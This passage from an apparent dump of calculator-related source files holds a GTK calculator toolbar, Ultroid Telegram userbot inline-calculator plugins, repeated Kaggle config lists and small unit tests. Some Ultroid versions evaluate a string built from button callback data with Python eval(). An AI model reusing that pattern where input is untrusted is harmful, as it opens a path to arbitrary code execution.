calc.button_pressed(calc.TYPE_TEXT, 'help(And)')), -1)\n\n        self.insert(IconToolButton(\n            'boolean-or', _('Logical or'),\n            lambda x: calc.button_pressed(calc.TYPE_OP_POST, '|'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(Or)')), -1)\n\n#        self.insert(IconToolButton('boolean-xor', _('Logical xor'),\n#            lambda x: calc.button_pressed(calc.TYPE_OP_POST, '^'),\n#            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(xor)')), -1)\n\n        self.insert(LineSeparator(), -1)\n\n        self.insert(IconToolButton(\n            'boolean-eq', _('Equals'),\n            lambda x: calc.button_pressed(calc.TYPE_OP_POST, '==')), -1)\n\n        self.insert(IconToolButton(\n            'boolean-neq', _('Not equals'),\n            lambda x: calc.button_pressed(calc.TYPE_OP_POST, '!=')), -1)\n\n        self.show_all()\n\n\nclass MiscToolbar(gtk.Toolbar):\n\n    def __init__(self, calc, target_toolbar=None):\n        self._target_toolbar = target_toolbar\n\n        gtk.Toolbar.__init__(self)\n\n        self.insert(IconToolButton('constants-pi', _('Pi'),\n                                   lambda x: calc.button_pressed(\n                                       calc.TYPE_TEXT, 'pi'),\n                                   alt_html='\u03c0'), -1)\n\n        self.insert(IconToolButton(\n            'constants-e', _('e'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'e')), -1)\n\n        self.insert(IconToolButton(\n            'constants-eulersconstant', _('\u03b3'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT,\n                                          '0.577215664901533')), -1)\n\n        self.insert(IconToolButton(\n            'constants-goldenratio', _('\u03c6'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT,\n                                          '1.618033988749895')), -1)\n\n        self._line_separator1 = LineSeparator()\n        self._line_separator2 = LineSeparator()\n\n        self._plot_button = IconToolButton(\n            'plot', _('Plot'),\n            lambda x: calc.button_pressed(calc.TYPE_FUNCTION, 'plot'),\n            lambda x: calc.button_pressed(calc.TYPE_TEXT, 'help(plot)'))\n\n        el = [\n            {'icon': 'format-deg', 'desc': _('Degrees'), 'html': 'deg'},\n            {'icon': 'format-rad', 'desc': _('Radians'), 'html': 'rad'},\n        ]\n        self._angle_button = IconToggleToolButton(\n            el,\n            lambda x: self.update_angle_type(x, calc),\n            _('Degrees / Radians'))\n        self.update_angle_type('deg', calc)\n\n        el = [\n            {'icon': 'format-sci', 'html': 'sci'},\n            {'icon': 'format-exp', 'html': 'exp'},\n        ]\n        self._format_button = IconToggleToolButton(\n            el,\n            lambda x: self.update_format_type(x, calc),\n            _('Exponent / Scientific notation'))\n\n        el = [\n            {'icon': 'digits-9', 'html': '9'},\n            {'icon': 'digits-12', 'html': '12'},\n            {'icon': 'digits-15', 'html': '15'},\n            {'icon': 'digits-6', 'html': '6'},\n        ]\n        self._digits_button = IconToggleToolButton(\n            el,\n            lambda x: self.update_digits(x, calc),\n            _('Number of shown digits'))\n\n        el = [\n            {'icon': 'base-10', 'html': '10'},\n            {'icon': 'base-2', 'html': '2'},\n            {'icon': 'base-16', 'html': '16'},\n            {'icon': 'base-8', 'html': '8'}\n        ]\n\n        self._base_button = IconToggleToolButton(\n            el,\n            lambda x: self.update_int_base(x, calc),\n            _('Integer formatting base'))\n\n        self.update_layout()\n\n        self.show_all()\n\n    def update_layout(self):\n        if gtk.gdk.screen_width() < 14 * GRID_CELL_SIZE or \\\n                self._target_toolbar is None:\n            target_toolbar = self\n            if self._target_toolbar is not None:\n                self._remove_buttons(self._target_toolbar)\n        else:\n            target_toolbar = self._target_toolbar\n            self._remove_buttons(self)\n\n        target_toolbar.insert(self._line_separator1, -1)\n\n        target_toolbar.insert(self._plot_button, -1)\n\n        target_toolbar.insert(self._line_separator2, -1)\n\n        target_toolbar.insert(self._angle_button, -1)\n        target_toolbar.insert(self._format_button, -1)\n        target_toolbar.insert(self._digits_button, -1)\n        target_toolbar.insert(self._base_button, -1)\n\n    def _remove_buttons(self, toolbar):\n        for item in [self._plot_button, self._line_separator1,\n                     self._line_separator2, self._angle_button,\n                     self._format_button, self._digits_button,\n                     self._base_button]:\n            toolbar.remove(item)\n\n    def update_angle_type(self, text, calc):\n        var = calc.parser.get_var('angle_scaling')\n        if var is None:\n            _logger.warning('Variable angle_scaling not defined.')\n            return\n\n        if text == 'deg':\n            var.value = MathLib.ANGLE_DEG\n        elif text == 'rad':\n            var.value = MathLib.ANGLE_RAD\n        _logger.debug('Angle scaling: %s', var.value)\n\n    def update_format_type(self, text, calc):\n        if text == 'exp':\n            calc.ml.set_format_type(MathLib.FORMAT_EXPONENT)\n        elif text == 'sci':\n            calc.ml.set_format_type(MathLib.FORMAT_SCIENTIFIC)\n        _logger.debug('Format type: %s', calc.ml.format_type)\n\n    def update_digits(self, text, calc):\n        calc.ml.set_digit_limit(int(text))\n        _logger.debug('Digit limit: %s', calc.ml.digit_limit)\n\n    def update_int_base(self, text, calc):\n        calc.ml.set_integer_base(int(text))\n        _logger.debug('Integer base: %s', calc.ml.integer_base)\n", "178": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "179": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "180": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "181": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "182": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "183": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "184": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "185": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "186": "import  unittest\nimport calc\n\nclass TestCalc(unittest.TestCase):\n    def test_add(self):\n        # For example\n        # result = calc.add(6,1)\n        # self.assertEqual(result, 7)\n        self.assertEqual(calc.add(-1,2), 1)\n        self.assertEqual(calc.add(-1,-2), -3)\n        self.assertEqual(calc.add(0,0), 0)\n\n    def test_sub(self):\n        self.assertEqual(calc.sub(-1,2), -3)\n        self.assertEqual(calc.sub(-1,-2), 1)\n        self.assertEqual(calc.sub(0,0), 0)\n\n    def test_multi(self):\n        self.assertEqual(calc.multi(-1,2), -2)\n        self.assertEqual(calc.multi(-1,-2), 2)\n        self.assertEqual(calc.multi(0,0), 0)\n\n    def test_divide(self):\n        self.assertEqual(calc.divide(-1,2), -0.5)\n        self.assertEqual(calc.divide(-1,-2), 0.5)\n        \n        # self.assertRaises(ValueError, calc.divide, 1, 0)\n        with self.assertRaises(ValueError):\n            calc.divide(1, 0)\n\nif __name__ == '__main__':\n    unittest.main()", "187": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               